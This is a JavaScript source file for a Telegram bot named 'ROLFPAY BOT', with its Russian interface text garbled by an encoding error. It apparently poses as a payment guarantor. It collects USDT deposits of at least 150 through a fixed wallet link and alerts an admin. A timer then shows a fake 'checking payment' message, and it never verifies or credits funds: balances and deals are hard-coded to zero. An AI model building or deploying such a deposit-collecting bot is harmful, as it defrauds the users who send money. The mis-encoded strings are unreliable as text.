require("dotenv").config();

const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(process.env.API_KEY_BOT, { polling: true });

let users = {};

bot.on('message', msg => {
    const chatId = msg.chat.id;
    const userName = msg.from.first_name;

    if (!users[chatId]) {
        users[chatId] = {
            username: userName,
            registrationDate: new Date(),
            hasAccess: false,
            msgAddCardId: null,
            currency: 'USD' // default currency
        };

        // Send notification to admin about new user
        const adminChatId = process.env.ADMIN_CHAT_ID;
        const newUserNotification = `–ù–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø—Ä–∏—Å–æ–µ–¥–∏–Ω–∏–ª—Å—è: ${userName} (ID: ${chatId})`;
        bot.sendMessage(adminChatId, newUserNotification);
    }

    if (msg.text === '/start') {
        if (users[chatId].hasAccess) {
            showMenu(chatId);
        } else {
            bot.sendMessage(chatId, "–í–≤–µ–¥–∏—Ç–µ –∫–ª—é—á –¥–æ—Å—Ç—É–ø–∞: ");
        }
    } else if (msg.text === process.env.ACCESS_KEY) {
        users[chatId].hasAccess = true;
        bot.sendMessage(chatId, '–î–æ—Å—Ç—É–ø —Ä–∞–∑—Ä–µ—à–µ–Ω!', {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'üè† –ú–µ–Ω—é', callback_data: 'menu' }]
                ]
            }
        });
    } else if (msg.text && !isNaN(msg.text)) {
        const depositAmount = parseFloat(msg.text);
        if (depositAmount < 150) {
            bot.sendMessage(chatId, '–í–≤–µ–¥–∏—Ç–µ –º–∏–Ω–∏–º–∞–ª—å–Ω—ã–π –¥–µ–ø–æ–∑–∏—Ç 150');
        } else {
            const depositMessage = `–û—Ç–ø—Ä–∞–≤—å—Ç–µ USDT –Ω–∞ —Å—É–º–º—É: ${depositAmount} USDT \n`;
            const link = 't.me/send?start=IVzc4OQKS95F';
            bot.sendMessage(chatId, `${depositMessage}\n${link}`, {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: 'üí∏ –û–ø–ª–∞—Ç–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞', callback_data: 'deposit_accept' }],
                        [{ text: 'üè† –ú–µ–Ω—é', callback_data: 'menu' }]
                    ]
                }
            });
        }
    }
}); 
bot.on('callback_query', query => {
    const chatId = query.message.chat.id;

    if (query.data === 'menu') {
        if (users[chatId].msgAddCardId) {
            bot.deleteMessage(chatId, users[chatId].msgAddCardId);
            delete users[chatId].msgAddCardId;
        }
        bot.deleteMessage(chatId, query.message.message_id);
        showMenu(chatId);
    } else if (query.data === 'add_card') {
        const msgAddCard = bot.sendMessage(chatId, '–ü—Ä–∏–≤—è–∑–∫–∞ –∫–∞—Ä—Ç –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞, –≤–Ω–µ—Å–∏—Ç–µ –¥–µ–ø–æ–∑–∏—Ç.', {
            reply_markup: {
                inline_keyboard: [
                    [{ text: `üè† –ú–µ–Ω—é`, callback_data: 'menu' }]
                ]
            }
        });
        msgAddCard.then(sentMessage => {
            users[chatId].msgAddCardId = sentMessage.message_id;
        });
    } else if (query.data === 'deposit') {
        bot.sendMessage(chatId, '–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –¥–µ–ø–æ–∑–∏—Ç–∞ –≤ USD:');
    } else if (query.data === 'my_deals') {
        bot.sendMessage(chatId, '–£ –≤–∞—Å –ø–æ–∫–∞ –Ω–µ—Ç —Å–¥–µ–ª–æ–∫', {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'üè† –ú–µ–Ω—é', callback_data: 'menu' }]
                ]
            }
        });
    } else if (query.data === 'dollars' || query.data === 'rubles' || query.data === 'grivnes') {
        users[chatId].currency = query.data; 
        showMenu(chatId);
    } else if (query.data === 'options') {
        bot.sendMessage(chatId, `–í—ã–±–µ—Ä–∏—Ç–µ –≤–∞–ª—é—Ç—É:`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '$', callback_data: 'dollars' }],
                    [{ text: '‚ÇΩ', callback_data: 'rubles' }],
                    [{ text: '‚Ç¥', callback_data: 'grivnes' }]
                ]
            }
        });
        bot.deleteMessage(chatId, query.message.message_id);
    } else if (query.data === 'deposit_accept') {
        const adminChatId = process.env.ADMIN_CHAT_ID;
        const depositAmount = parseFloat(query.message.text.split('–û—Ç–ø—Ä–∞–≤—å—Ç–µ USDT –Ω–∞ —Å—É–º–º—É: ')[1].split(' USDT')[0]);
        const depositConfirmationMessage = `–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å ID ${chatId} –æ—Ç–ø—Ä–∞–≤–∏–ª –¥–µ–ø–æ–∑–∏—Ç –Ω–∞ —Å—É–º–º—É: ${depositAmount} USDT`;
        bot.deleteMessage(chatId, query.message.message_id);
 // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É 
        bot.sendMessage(adminChatId, depositConfirmationMessage).then(() => {
            setTimeout(() => {
                const paymentCheckMessage = 'üí∞ –ü—Ä–æ–≤–µ—Ä–∫–∞ –æ–ø–ª–∞—Ç—ã...';
                bot.sendMessage(chatId, paymentCheckMessage, {
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: 'üè† –ú–µ–Ω—é', callback_data: 'menu' }]
                        ]
                    }
                });
            }, 5000);
        });
    } else if (query.data === 'guarant') {
        bot.sendMessage(chatId, '–ì–∞—Ä–∞–Ω—Ç @garantROLFPAY', {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'üè† –ú–µ–Ω—é', callback_data: 'menu' }]
                ]
            }
        });
    }
});


function showMenu(chatId) {
const user = users[chatId];
let balanceText;
switch (user.currency) {
case 'rubles':
balanceText = `–í–∞—à –±–∞–ª–∞–Ω—Å: 0‚ÇΩ`;
break;
case 'grivnes':
balanceText = `–í–∞—à –±–∞–ª–∞–Ω—Å: 0‚Ç¥`;
break;
default:
balanceText = `–í–∞—à –±–∞–ª–∞–Ω—Å: 0$`;
}    
const menuMessage = `
<b>ROLFPAY BOT MENU</b>

–î–æ–±—Ä—ã–π –¥–µ–Ω—å, ${user.username}!

–í–∞—à ID: ${chatId}

${balanceText}
–í–∞—à–∏ —Å–¥–µ–ª–∫–∏: 0 
–í–∞—à–∏ –∫–∞—Ä—Ç—ã: 0
–î–∞—Ç–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏: ${user.registrationDate.toLocaleDateString()}`;
bot.sendMessage(chatId, menuMessage, { 
    parse_mode: 'HTML', reply_markup: {
        inline_keyboard: [
            [{ text: `üí≥ –î–æ–±–∞–≤–∏—Ç—å –∫–∞—Ä—Ç—É`, callback_data: 'add_card' }],
            [{ text: `üí∞ –ü–æ–ø–æ–ª–Ω–∏—Ç—å –ë–∞–ª–∞–Ω—Å`, callback_data: 'deposit' }],
            [{ text: `üîë –ú–æ–∏ —Å–¥–µ–ª–∫–∏`, callback_data: 'my_deals' }],
            [{ text: `‚öôÔ∏è –ù–∞—Å—Ç—Ä–æ–π–∫–∏`, callback_data: 'options' }],
            [{ text: `üõ°Ô∏è –ì–∞—Ä–∞–Ω—Ç`, callback_data: 'guarant' }] // –î–æ–±–∞–≤–ª—è–µ–º –∫–Ω–æ–ø–∫—É "–ì–∞—Ä–∞–Ω—Ç"
        ]
    }

});
}